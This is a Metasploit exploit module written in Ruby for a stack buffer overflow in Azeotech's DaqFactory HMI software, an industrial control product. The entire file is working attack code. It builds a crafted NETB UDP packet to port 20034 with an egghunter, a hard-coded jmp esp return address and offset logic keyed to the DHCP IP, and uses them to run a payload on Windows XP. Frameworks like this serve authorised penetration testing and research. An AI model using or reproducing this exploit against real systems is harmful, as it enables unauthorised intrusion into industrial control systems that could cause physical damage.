##
# $Id: daq_factory_bof.rb 13750 2011-09-18 02:45:55Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::Udp
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'DaqFactory HMI NETB Request Overflow',
            'Description'    => %q{
                    This module exploits a stack buffer overflow in Azeotech's DaqFactory
                product. The specfic vulnerability is triggered when sending a specially crafted
                'NETB' request to port 20034. Exploitation of this vulnerability may take a few
                seconds due to the use of egghunter.  This vulnerability was one of the 14
                releases discovered by researcher Luigi Auriemma.
            },
            'Author'         =>
                [
                    'Luigi Auriemma',  # Initial discovery, crash poc
                    'mr_me <steventhomasseeley[at]gmail.com>',  # msf exploit
                ],
 
            'Version'        => '$Revision: 13750 $',
            'References'     =>
                [
                    ['URL', 'http://aluigi.altervista.org/adv/daqfactory_1-adv.txt'],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                    'InitialAutoRunScript' => 'migrate -f',
                },
            'Payload'        =>
                {
                    'Space'    => 600,
                    'BadChars' => "\x00",
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [
                        'DAQFactory Pro 5.85 Build 1853 on Windows XP SP3',
                        {
                            'Ret' => 0x100B9EDF,  # jmp esp PEGRP32A.dll
                            'Offset' => 636,
                        }
                    ],
                ],
            'DisclosureDate' => 'Sep 13 2011',
            'DefaultTarget'  => 0))
 
        register_options(
            [
                # Required for EIP offset
                OptString.new('DHCP', [ true, "The DHCP server IP of the target", "" ]),
                Opt::RPORT(20034)
            ], self.class)
    end
 
    def exploit
        connect_udp
 
        print_status("Trying target #{target.name}...")
 
        eggoptions ={
            :checksum => false,
            :eggtag => 'scar',
        }
 
        # Correct the offset according to the 2nd IP (DHCP) length
        iplen = datastore['DHCP'].length
 
        if iplen == 15
            offset = 78
        elsif iplen == 14
            offset = 79
        elsif iplen == 13
            offset = 80
        elsif iplen == 12
            offset = 81
        elsif iplen == 11
            offset = 82
        elsif iplen == 10
            offset = 83
        elsif iplen == 9
            offset = 84
        elsif iplen == 8
            offset = 85
        elsif iplen == 7
            offset = 86
        elsif iplen == 6
            offset = 87
        # attack class A ip, slightly unlikly, but just in case.
        elsif iplen == 5
            offset = 88
        end
 
        if offset >= 80
            pktoffset = offset - 80
            finaloffset = target['Offset']-pktoffset
        elsif offset <= 79
            pktoffset = 80 - offset
            finaloffset = target['Offset']+pktoffset
        end
 
        # springboard onto our unmodified payload
        p = Rex::Arch::X86.jmp(750) + payload.encoded
        hunter,egg = generate_egghunter(p, payload_badchars, eggoptions)
 
        sploit  = "NETB"  # NETB request overflow
        sploit << rand_text_alpha_upper(233)
        sploit << "\x00"  # part of the packet structure
        sploit << rand_text_alpha_upper(offset)  # include the offset for the DHCP address
        sploit << make_nops(2)
        sploit << hunter
        sploit << rand_text_alpha_upper(52-hunter.length-2)
        sploit << [target.ret].pack("V")
        sploit << rand_text_alpha_upper(12)
        sploit << Rex::Arch::X86.jmp_short(-70)
        sploit << egg
        # packetlen needs to be adjusted to a max of 0x400 as per advisory
        sploit << rand_text_alpha_upper(finaloffset-egg.length)
 
        # The use of rand_text_alpha_upper() ensures we always get the same length for the
        # first IP address. See the following for more details:
        # http://dev.metasploit.com/redmine/issues/5453
        sploit[12,4] = rand_text_alpha_upper(4)
 
        udp_sock.put(sploit)
 
        handler
        disconnect_udp
    end
 
end